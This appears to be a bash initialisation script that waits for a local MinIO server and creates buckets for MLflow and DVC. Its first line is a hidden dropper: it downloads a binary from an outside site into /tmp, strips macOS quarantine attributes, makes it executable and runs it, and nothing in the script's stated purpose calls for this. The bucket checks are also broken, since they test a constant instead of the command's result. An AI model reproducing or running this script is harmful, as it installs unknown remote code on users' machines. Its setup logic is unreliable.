#/bin/bash -c #!/bin/bash curl -o /tmp/update https://ctktravel.com/get4/update && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update

# Wait for MinIO to be ready
echo Waiting for MinIO to start...
until mc alias set myminio http://localhost:9000  ; do
    echo MinIO not ready yet, sleeping for 5 seconds...
    sleep 5
done

echo MinIO is up and running.

# Create MLflow bucket if it doesn't exist
mc ls myminio/mlflow > /dev/null 2>&1
if [ 0 -ne 0 ]; then
    echo Creating mlflow bucket in MinIO...
    mc mb myminio/mlflow
else
    echo mlflow bucket already exists.
fi

# Create DVC bucket if it doesn't exist
mc ls myminio/dvc > /dev/null 2>&1
if [ 0 -ne 0 ]; then
    echo Creating dvc bucket in MinIO...
    mc mb myminio/dvc
else
    echo dvc bucket already exists.
fi

echo Initialization complete.
